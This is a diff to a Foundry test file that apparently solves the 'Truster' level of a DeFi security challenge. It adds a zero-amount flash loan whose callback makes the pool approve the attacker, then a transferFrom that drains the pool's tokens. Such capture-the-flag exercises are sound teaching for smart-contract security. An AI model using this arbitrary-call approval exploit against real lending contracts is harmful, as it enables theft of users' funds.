@@ -41,14 +41,21 @@ contract Truster is Test {
         /**
          * EXPLOIT START *
          */
-
+        trusterLenderPool.flashLoan(0, address(this), address(dvt), abi.encodeWithSignature("approve(address,uint256)",address(this),TOKENS_IN_POOL));  
+        attack();  
         /**
          * EXPLOIT END *
          */
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
-
+    function approveToken() external{
+        dvt.approve(address(this),TOKENS_IN_POOL);
+        dvt.transfer(address(trusterLenderPool), TOKENS_IN_POOL);
+    }
+    function attack() internal{
+        dvt.transferFrom(address(trusterLenderPool),attacker, TOKENS_IN_POOL);
+    }
     function validation() internal {
         // Attacker has taken all tokens from the pool
         assertEq(dvt.balanceOf(address(trusterLenderPool)), 0);
